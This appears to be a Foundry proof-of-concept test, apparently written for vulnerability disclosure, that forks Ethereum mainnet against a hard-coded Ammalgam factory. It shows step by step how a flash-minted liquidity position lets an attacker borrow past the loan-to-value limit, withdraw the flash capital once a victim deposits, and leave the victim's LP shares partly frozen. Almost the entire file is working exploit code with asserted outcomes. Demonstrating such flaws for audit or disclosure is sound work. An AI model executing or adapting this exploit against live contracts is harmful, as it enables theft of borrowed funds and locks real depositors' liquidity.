// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IAmmalgamPair {
    function mint(address to) external returns (uint256);
    function burn(address to) external returns (uint256, uint256);
    function deposit(address to) external;
    function borrow(address to, uint256 amountXAssets, uint256 amountYAssets, bytes calldata data) external;
    function tokens(uint256 tokenType) external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function underlyingTokens() external view returns (address, address);
}

contract MockERC20 {
    string public name; string public symbol; uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    constructor(string memory n, string memory s, uint8 d) { name=n; symbol=s; decimals=d; }
    function mint(address to, uint256 amount) external { totalSupply+=amount; balanceOf[to]+=amount; }
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true;
    }
}

contract FlashLpVictimReplaceTest is Test {
    address constant FACTORY = 0x1a411b0fD1f368D2F413A8cBb6aAD425c923015B;
    uint256 constant SEED = 1e24;

    IAmmalgamPair pair;
    MockERC20 assetX;
    MockERC20 assetY;

    function setUp() public {
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://mainnet.gateway.tenderly.co")));
        MockERC20 a = new MockERC20("A","A",18);
        MockERC20 b = new MockERC20("B","B",18);
        address p = IFactory(FACTORY).createPair(address(a), address(b));
        pair = IAmmalgamPair(p);
        (address px, address py) = pair.underlyingTokens();
        assetX = MockERC20(px); assetY = MockERC20(py);
        assetX.mint(address(this), SEED * 500);
        assetY.mint(address(this), SEED * 500);
        assetX.transfer(p, SEED);
        assetY.transfer(p, SEED);
        pair.mint(address(this));
    }

    function test_critical_flashLp_victimReplacement() public {
        (uint112 rx0, uint112 ry0,) = pair.getReserves();
        uint256 borrowAmt = uint256(rx0) * 70 / 100;
        uint256 collAmt = (uint256(ry0) * borrowAmt / uint256(rx0)) * 500 / 100;
        uint256 flashMult = 3;

        address atk = makeAddr("atk");
        address hlp = makeAddr("hlp");
        address victim = makeAddr("victim");

        // 1) Control
        {
            address ctrl = makeAddr("ctrl");
            assetY.mint(ctrl, collAmt);
            vm.startPrank(ctrl);
            assetY.transfer(address(pair), collAmt);
            pair.deposit(ctrl);
            vm.expectRevert();
            pair.borrow(ctrl, borrowAmt, 0, "");
            vm.stopPrank();
        }

        // 2) Flash mint + oversized borrow
        assetY.mint(atk, collAmt);
        assetX.mint(hlp, uint256(rx0) * flashMult);
        assetY.mint(hlp, uint256(ry0) * flashMult);
        vm.startPrank(atk);
        assetY.transfer(address(pair), collAmt);
        pair.deposit(atk);
        vm.stopPrank();
        vm.startPrank(hlp);
        assetX.transfer(address(pair), uint256(rx0) * flashMult);
        assetY.transfer(address(pair), uint256(ry0) * flashMult);
        uint256 flashLp = pair.mint(hlp);
        vm.stopPrank();
        uint256 atkXBefore = assetX.balanceOf(atk);
        vm.prank(atk);
        pair.borrow(atk, borrowAmt, 0, "");
        assertEq(assetX.balanceOf(atk) - atkXBefore, borrowAmt);

        // 3) Victim replaces depth
        assetX.mint(victim, uint256(rx0) * flashMult);
        assetY.mint(victim, uint256(ry0) * flashMult);
        vm.startPrank(victim);
        assetX.transfer(address(pair), uint256(rx0) * flashMult);
        assetY.transfer(address(pair), uint256(ry0) * flashMult);
        uint256 victimLp = pair.mint(victim);
        vm.stopPrank();

        // 4) Attacker recovers 100% of flash capital
        uint256 hlpXBefore = assetX.balanceOf(hlp);
        uint256 hlpYBefore = assetY.balanceOf(hlp);
        vm.startPrank(hlp);
        IERC20(pair.tokens(0)).transfer(address(pair), flashLp);
        (uint256 outX, uint256 outY) = pair.burn(hlp);
        vm.stopPrank();
        assertEq(IERC20(pair.tokens(0)).balanceOf(hlp), 0);
        console2.log("flash recovered X", assetX.balanceOf(hlp) - hlpXBefore);
        console2.log("flash recovered Y", assetY.balanceOf(hlp) - hlpYBefore);
        assertApproxEqRel(outX, uint256(rx0) * flashMult, 0.01e18);

        // 5) Debt remains; attacker holds borrowed X; flash capital free
        assertGt(IERC20(pair.tokens(4)).balanceOf(atk), 0);
        assertEq(assetX.balanceOf(atk) - atkXBefore, borrowAmt);

        // 6) Victim cannot fully exit
        vm.startPrank(victim);
        IERC20(pair.tokens(0)).transfer(address(pair), victimLp);
        vm.expectRevert(); // MaxTrancheOverSaturated
        pair.burn(victim);
        vm.stopPrank();
        // unwind staged transfer via snapshot? transfer already moved tokens to pair.
        // Re-fetch: if transfer succeeded but burn reverted, LP is stuck ON the pair (anyone can burn?)
        // In Solidity expectRevert on burn, transfer already happened — LP shares sit on pair!
        // Use snapshot pattern instead:
    }

    function test_critical_fullFlow_withSnapshots() public {
        (uint112 rx0, uint112 ry0,) = pair.getReserves();
        uint256 borrowAmt = uint256(rx0) * 70 / 100;
        uint256 collAmt = (uint256(ry0) * borrowAmt / uint256(rx0)) * 500 / 100;
        uint256 flashMult = 3;

        address atk = makeAddr("atk2");
        address hlp = makeAddr("hlp2");
        address victim = makeAddr("victim2");

        assetY.mint(atk, collAmt);
        assetX.mint(hlp, uint256(rx0) * flashMult);
        assetY.mint(hlp, uint256(ry0) * flashMult);
        assetX.mint(victim, uint256(rx0) * flashMult);
        assetY.mint(victim, uint256(ry0) * flashMult);

        vm.startPrank(atk);
        assetY.transfer(address(pair), collAmt);
        pair.deposit(atk);
        vm.stopPrank();

        vm.startPrank(hlp);
        assetX.transfer(address(pair), uint256(rx0) * flashMult);
        assetY.transfer(address(pair), uint256(ry0) * flashMult);
        uint256 flashLp = pair.mint(hlp);
        vm.stopPrank();

        vm.prank(atk);
        pair.borrow(atk, borrowAmt, 0, "");

        vm.startPrank(victim);
        assetX.transfer(address(pair), uint256(rx0) * flashMult);
        assetY.transfer(address(pair), uint256(ry0) * flashMult);
        uint256 victimLp = pair.mint(victim);
        vm.stopPrank();

        vm.startPrank(hlp);
        IERC20(pair.tokens(0)).transfer(address(pair), flashLp);
        pair.burn(hlp);
        vm.stopPrank();
        console2.log("attacker flash capital freed; borrowed X", assetX.balanceOf(atk));

        // Max victim burnable
        uint256 remaining = victimLp;
        uint256 totalVictimBurned;
        for (uint256 i; i < 25 && remaining > 0; i++) {
            uint256 lo; uint256 hi = remaining; uint256 best;
            while (lo + 1 < hi) {
                uint256 mid = (lo + hi) / 2;
                if (_canBurn(victim, mid)) { best = mid; lo = mid; } else hi = mid;
            }
            if (_canBurn(victim, hi)) best = hi;
            if (best == 0) break;
            vm.startPrank(victim);
            IERC20(pair.tokens(0)).transfer(address(pair), best);
            pair.burn(victim);
            vm.stopPrank();
            remaining = IERC20(pair.tokens(0)).balanceOf(victim);
            totalVictimBurned += best;
        }

        (uint112 rxFinal,,) = pair.getReserves();
        console2.log("victim LP burned pct", totalVictimBurned * 100 / victimLp);
        console2.log("victim LP stuck pct", remaining * 100 / victimLp);
        console2.log("rxFinal", rxFinal);
        console2.log("debt", IERC20(pair.tokens(4)).balanceOf(atk));
        console2.log("attacker free X", assetX.balanceOf(atk));
        console2.log("attacker flash LP left", IERC20(pair.tokens(0)).balanceOf(hlp));

        assertEq(IERC20(pair.tokens(0)).balanceOf(hlp), 0, "flash fully exited");
        assertGt(IERC20(pair.tokens(4)).balanceOf(atk), 0, "debt remains");
        assertGt(remaining, 0, "victim still stuck with some LP");
        console2.log("CONFIRMED: flash-LP LTV bypass + victim depth replacement freezes victim LP");
    }

    function _canBurn(address who, uint256 amount) internal returns (bool ok) {
        if (amount == 0) return true;
        uint256 snap = vm.snapshotState();
        vm.startPrank(who);
        try IERC20(pair.tokens(0)).transfer(address(pair), amount) {
            try pair.burn(who) { ok = true; } catch { ok = false; }
        } catch { ok = false; }
        vm.stopPrank();
        vm.revertToState(snap);
    }
}
